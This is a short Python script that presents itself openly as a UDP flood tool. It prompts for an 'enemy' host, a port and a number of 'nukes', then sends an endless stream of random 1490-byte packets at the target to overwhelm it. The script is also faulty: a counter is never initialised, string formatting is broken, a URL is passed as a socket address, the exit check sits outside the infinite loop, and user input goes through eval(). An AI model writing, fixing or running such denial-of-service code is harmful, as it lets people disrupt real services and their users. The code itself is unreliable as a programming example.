import requests
import os
import socket
import random 
print("Write your enemy (with http:// or https://)")
gonnacooked = input()
print("which port do you want to explode")
whichport =eval(input())
print("How much nukes need to send ")
amountofnukes =eval(input())
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
while  True:
    sock.sendto(bytes ,(gonnacooked, whichport))
    nukes = nukes +1
    print ("nuked %s times to %s trought little port:%s "(nukes,gonnacooked,whichport ) )
if nukes > amountofnukes:
    print("Done!")
    input("ress Enter to exit")
